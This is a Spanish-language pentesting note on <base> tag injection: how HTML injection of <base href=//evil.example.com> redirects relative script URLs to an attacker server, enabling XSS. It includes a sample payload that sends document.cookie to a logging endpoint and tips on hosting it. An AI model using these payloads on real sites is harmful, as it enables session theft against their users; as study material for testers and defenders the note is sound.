# Teoría

La etiqueta HTML `<base>` especifica, mediante el atributo `href`, la **URL base para todas las URLs relativas**[^1] en un documento.

Solamente puede haber una etiqueta `<base>` por documento. En el caso de existir varias, solamente se procesa la primera.

```html
<base href="http://example.com" />
<base href="http://example.org" />       <!--           IGNORED            -->

<a href="/link">Link</a>                 <!-- http://example.com/link      -->
<img src="img.png" />                    <!-- http://example.com/img.png   -->
<link rel="stylesheet" href="src.css" /> <!-- http://example.com/src.css   -->
<script src="js/src.js"></script>        <!-- http://example.com/js/src.js -->
```

# Vulnerabilidad

Si un sitio web permite [[HTML Injection (HTMLi)]], un atacante puede **inyectar una etiqueta `<base>` maliciosa** forzando que las URLs relativas apunten hacia un dominio controlado por el atacante.

```html
<base href=https://evil.example.com>
```

Esto es especialmente útil en escenarios donde no se puede conseguir [[Cross-Site Scripting (XSS)]] de la manera tradicional.

# Explotación

Para explotar esta vulnerabilidad, se tienen que cumplir los siguientes requisitos:

- [ ] El sitio web es vulnerable a [[HTML Injection (HTMLi)]]
- [ ] El sitio web utiliza URLs relativas
- [ ] La cabecera de **Política de Seguridad de Contenidos** (CSP) no restringe la directiva `base-uri` (ya sea porque no está definida, usa `*` o permite el dominio malicioso)

Además, es necesario levantar y configurar un servidor que ofrezca contenido malicioso. Por ejemplo: 

```javascript
alert('XSS via <base> injection')
console.log('XSS via <base> injection')
fetch('/log?cookie=' + btoa(document.cookie))
```

Por último, se inyecta mediante [[HTML Injection (HTMLi)]] en el sitio web vulnerable la etiqueta `<base>` maliciosa:

```html
<base href=//evil.example.com>
```

>[!warning] `<base>` extrae únicamente el **origen** (protocolo:dominio:puerto) del `href`, ignorando el resto de la URL.
>Es recomendable usar [Beeceptor](https://beeceptor.com/), ya que funciona mediante subdominios y permite controlar el contenido de las respuestas mediante reglas personalizables.

[^1]: Las URL relativas son aquellas que se resuelve en relación con la URL de la página actual.
